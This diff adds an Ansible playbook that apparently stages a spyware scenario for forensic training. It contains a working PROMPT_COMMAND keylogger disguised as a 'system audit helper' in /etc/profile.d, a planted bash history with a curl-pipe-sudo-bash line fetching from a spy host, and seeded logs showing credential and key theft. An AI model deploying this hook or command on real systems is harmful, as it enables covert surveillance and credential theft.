@@ -1,0 +1,69 @@
+---
+- name: Ensure hidden directories exist
+  file:
+    path: "{{ item }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+  loop:
+    - /usr/local/lib/.monitor
+    - /var/lib/.monitor
+
+- name: Plant bash history showing the curl-pipe-bash install
+  copy:
+    dest: "/home/{{ victim_user }}/.bash_history"
+    owner: "{{ victim_user }}"
+    group: "{{ victim_user }}"
+    mode: "0600"
+    content: |
+      ls -la
+      df -h
+      free -m
+      curl -s http://{{ spy_host }}:8888/sys-agent-install.sh | sudo bash
+      ps aux | grep sys
+      systemctl status sys-monitor.timer
+      ssh {{ victim_user }}@colleague
+      cat project_notes.txt
+      cat vpn_credentials.txt
+      exit
+
+- name: Install keylogger hook via profile.d
+  copy:
+    dest: /etc/profile.d/sys-audit.sh
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      # System audit helper — managed by sys-agent
+      export PROMPT_COMMAND='echo "$(date -Is) $(whoami)@$(hostname) CMD: $(history 1 | sed "s/^[ ]*[0-9]*[ ]*//")" >> /var/lib/.monitor/keylog.log 2>/dev/null'
+
+- name: Seed keylog with realistic pre-captured activity
+  copy:
+    dest: "{{ keylog_path }}"
+    owner: root
+    group: root
+    mode: "0640"
+    content: |
+      2026-04-28T08:12:03+00:00 victimuser@victim CMD: ls -la
+      2026-04-28T08:12:11+00:00 victimuser@victim CMD: df -h
+      2026-04-28T08:13:02+00:00 victimuser@victim CMD: cat project_notes.txt
+      2026-04-28T08:14:45+00:00 victimuser@victim CMD: cat vpn_credentials.txt
+      2026-04-28T08:15:12+00:00 victimuser@victim CMD: ssh victimuser@colleague
+      2026-04-28T08:22:33+00:00 victimuser@victim CMD: mysql -u admin -p Sup3rS3cr3t! db_production
+      2026-04-28T08:23:01+00:00 victimuser@victim CMD: sudo cat /etc/shadow
+      2026-04-28T08:24:15+00:00 victimuser@victim CMD: gpg --export-secret-keys > /tmp/keys.gpg
+      2026-04-28T08:25:00+00:00 victimuser@victim CMD: exit
+
+- name: Write install log (root-only — hard investigative path)
+  copy:
+    dest: /var/lib/.monitor/install.log
+    owner: root
+    group: root
+    mode: "0600"
+    content: |
+      {{ ansible_date_time.iso8601 }} [SPYWARE] AGENT INSTALLED host={{ ansible_hostname }}
+      {{ ansible_date_time.iso8601 }} [SPYWARE] KEYLOGGER /etc/profile.d/sys-audit.sh ACTIVE
+      {{ ansible_date_time.iso8601 }} [SPYWARE] C2 {{ spy_host }}:{{ spy_port }} CONFIGURED
+      {{ ansible_date_time.iso8601 }} [SPYWARE] COLLECTOR sys-monitor.timer ENABLED
+      {{ ansible_date_time.iso8601 }} [SPYWARE] EXFIL sys-telemetry.timer ENABLED
